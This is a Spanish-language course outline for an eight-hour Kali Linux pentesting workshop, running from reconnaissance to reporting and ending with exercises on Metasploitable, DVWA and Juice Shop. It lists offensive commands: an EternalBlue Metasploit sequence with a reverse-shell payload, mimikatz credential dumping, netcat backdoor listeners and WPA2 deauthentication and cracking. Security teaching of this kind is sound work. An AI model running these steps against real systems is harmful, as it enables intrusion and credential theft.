# **Taller de Pentesting con Kali Linux - 8 Horas**

## **Objetivo General**
Proporcionar a los participantes conocimientos y habilidades para realizar pruebas de penetración utilizando Kali Linux, abordando todas las fases del pentesting desde el reconocimiento hasta la post-explotación.

## **Requisitos Previos**
- Conocimientos básicos de redes y sistemas operativos.
- Instalación previa de Kali Linux en una VM o hardware.
- Familiaridad con comandos básicos de Linux.

---

## **Temario Detallado**

### **⏰ Módulo 1: Introducción al Pentesting y a Kali Linux (1 Hora)**
**Objetivo:** Comprender los conceptos básicos del pentesting y las herramientas clave de Kali Linux.

- Introducción al Ethical Hacking y Pentesting.
- Fases del pentesting:
  - Reconocimiento
  - Escaneo
  - Explotación
  - Post-explotación
  - Reporte
- Familiarización con Kali Linux:
  - Instalación en VirtualBox/VMware.
  - Uso básico de la terminal: `ls`, `pwd`, `cd`, `ifconfig/ip a`, `whoami`.
  - Revisión de herramientas: `nmap`, `Metasploit`, `Burp Suite`, `Aircrack-ng`, `John the Ripper`.

**Ejercicio práctico:** Navegar por la terminal y ejecutar comandos básicos de Linux.

---

### **⏰ Módulo 2: Fase de Reconocimiento y Escaneo (2 Horas)**
**Objetivo:** Aprender a recolectar información del objetivo antes de ejecutar ataques.

#### **Fase de Reconocimiento**
- Reconocimiento pasivo:
  - `whois` - Obtener información de dominio.
  - `theHarvester` - Recolección de correos y subdominios.
- Reconocimiento activo:
  - `nslookup` y `dig` - Consulta de DNS.
  - `Shodan` - Búsqueda de dispositivos en internet.

#### **Escaneo de Puertos y Servicios**
- `nmap` - Tipos de escaneo:
  - `nmap -sS -p- <IP>` (Escaneo SYN).
  - `nmap -sV -A <IP>` (Detección de servicios y SO).
- `whatweb` - Identificación de tecnología web.

**Ejercicio práctico:** Escaneo completo de una red objetivo con `nmap` y `whatweb`.

---

### **⏰ Módulo 3: Explotación de Vulnerabilidades (2 Horas)**
**Objetivo:** Aprender a explotar vulnerabilidades en sistemas y aplicaciones web.

#### **Uso de Metasploit Framework**
- Comandos básicos: `search`, `use`, `set`, `run`.
- Generación de payloads con `msfvenom`.
- Ejemplo de explotación:
  - `use exploit/windows/smb/ms17_010_eternalblue`
  - `set RHOSTS <IP>`
  - `set PAYLOAD windows/meterpreter/reverse_tcp`
  - `run`

#### **Ataques Web y SQL Injection**
- `sqlmap` - Automatización de inyecciones SQL:
  - `sqlmap -u <URL> --dbs`
- `Burp Suite` - Manipulación de peticiones HTTP.

**Ejercicio práctico:** Uso de `Metasploit` y `sqlmap` en un entorno vulnerable.

---

### **⏰ Módulo 4: Post-Explotación y Persistencia (1.5 Horas)**
**Objetivo:** Aprender técnicas para mantener acceso y escalar privilegios.

- Elevación de privilegios:
  - `Privilege Escalation Awesome Scripts`.
- Extracción de credenciales con `mimikatz`, `hashdump`.
- Uso de `Meterpreter` para acceso remoto.
- Creación de puertas traseras:
  - `persistence`
  - `nc -lvp 4444`

**Ejercicio práctico:** Mantener acceso en un sistema comprometido.

---

### **⏰ Módulo 5: Auditoría y Explotación de Redes Inalámbricas (1 Hora)**
**Objetivo:** Comprender los ataques a redes WiFi y las medidas de protección.

- Monitorización con `airmon-ng`, `airodump-ng`.
- Ataques de desautenticación con `aireplay-ng`.
- Crackeo de WPA/WPA2 con `aircrack-ng` y `rockyou.txt`.

**Ejercicio práctico:** Captura de handshakes y ataque a WPA2.

---

### **⏰ Módulo 6: Reporte y Buenas Prácticas en Pentesting (30 Min)**
**Objetivo:** Aprender a documentar hallazgos y reportar vulnerabilidades.

- Documentación de pruebas con OWASP.
- Redacción de informes de seguridad.
- Código de ética y normativas (ISO 27001, GDPR).

**Ejercicio práctico:** Creación de un informe de hallazgos con evidencias.

---

### **⏰ Módulo 7: Ejercicios Prácticos de Pentesting en Entornos Simulados (1 Hora)**
**Objetivo:** Aplicar todos los conocimientos adquiridos en escenarios de pentesting reales.

- Configuración de entornos vulnerables:
  - Metasploitable 2
  - Damn Vulnerable Web App (DVWA)
  - OWASP Juice Shop
- Realización de ataques controlados:
  - Escaneo de red y puertos con `nmap`
  - Explotación de vulnerabilidades con `Metasploit`
  - Ataques de inyección SQL con `sqlmap`
  - Escalada de privilegios en Linux y Windows

**Ejercicio práctico:** Los participantes deberán completar una serie de pruebas en un entorno vulnerable y documentar sus hallazgos.
